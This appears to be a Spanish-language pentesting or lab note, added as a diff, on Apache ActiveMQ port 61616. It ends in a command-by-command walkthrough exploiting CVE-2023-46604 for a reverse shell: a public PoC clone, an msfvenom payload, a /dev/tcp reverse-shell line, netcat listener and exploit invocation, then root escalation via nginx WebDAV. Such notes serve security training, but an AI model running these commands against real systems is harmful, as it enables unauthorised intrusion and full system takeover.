@@ -1,0 +1,81 @@
+📌 Es el puerto por defecto de Apache ActiveMQ, un message broker muy usado en entornos empresariales.
+
+    Apache ActiveMQ es un sistema de mensajería que permite:
+
+        📬 Comunicación entre aplicaciones
+        🔁 Sistemas distribuidos
+        🏢 Integraciones empresariales
+        📦 Arquitecturas basadas en colas (queues)
+
+    Funciona como intermediario entre productores y consumidores de mensajes.
+
+⚙️ ¿Qué es el puerto 61616?
+
+    Es el puerto por defecto del protocolo:
+
+        OpenWire (protocolo propio de ActiveMQ)
+
+    Permite que clientes se conecten al broker para:
+
+        · Enviar mensajes
+        · Recibir mensajes
+        · Suscribirse a colas o topics
+
+🧠 Arquitectura simplificada
+
+    1️⃣ Aplicación A envía mensaje al broker
+    2️⃣ ActiveMQ lo almacena en una cola
+    3️⃣ Aplicación B lo recibe cuando esté disponible
+
+🧪 En pentesting
+
+    Si el 61616 está abierto:
+
+        Indica un broker ActiveMQ accesible. Puede permitir:
+
+            · Enumeración del servicio
+            · Acceso no autenticado
+            · Envío/lectura de mensajes
+            · Vulnerabilidades conocidas (RCE históricas)
+
+🔐 Riesgos comunes
+
+    · Broker expuesto a Internet
+    · Sin autenticación
+    · Versiones vulnerables
+    · Acceso a consola de administración
+
+    ActiveMQ mal configurado puede permitir incluso ejecución remota de código.
+
+🎯 Acceso a la máquina víctima realizando una Reverse Shell
+
+    ➡️ Versión 5.15.15 → CVE-2023-46604
+
+        Se busca en internet y nos relaciona con la vulnerabilidad CVE-2023-46604. Se explota usando la vulnerabilidad del siguiente repositorio: 
+
+            git clone https://github.com/rootsecdev/CVE-2023-46604
+
+        Una vez clonado, dentro del directorio, generamos un payload usando msfvenom para obtener un ejecutable ELF para subirlo a la máquina víctima: 
+
+            msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_Local> LPORT=4444 -f elf -o test.elf
+
+        Ahora en el fichero poc-linux.xml, editamos la fila justo debajo de donde está comentada por la siguiente línea (cambiando la IP local):
+
+            <value>bash -c 'bash -i &gt;&amp; /dev/tcp/<IP_Local>/4444 0&gt;&amp;1'</value> 
+    
+        Ahora arrancamos el servidor python y netcat listener con los siguientes comandos (en el mismo directorio): 
+
+            python3 -m http.server 8001 & nc -lvvp 4444
+
+        En otra terminal, ejecutamos el siguiente comando para iniciar la sesión en la máquina víctima. 
+
+            go run main.go -i <IP_Víctima> -p 61616 -u http://<IP_Local>:8001/poc-linux.xml
+
+        Para estabilizar la terminal, usamos el siguiente comando: 
+
+            script /dev/null -c bash
+
+        Ahora se realizará una escalada de privilegios para conseguir permisos de administrador. Se realizar un sudo -l y nos dice nginx.
+        
+        Se utilizará el módulo ngx_http_dav_module para escribir nuestra clave SSH pública en el archivo de claves autorizadas del usuario root (ver en el apartado Escalada de 
+        Privilegios / Según Sistema Operativo / Linux)
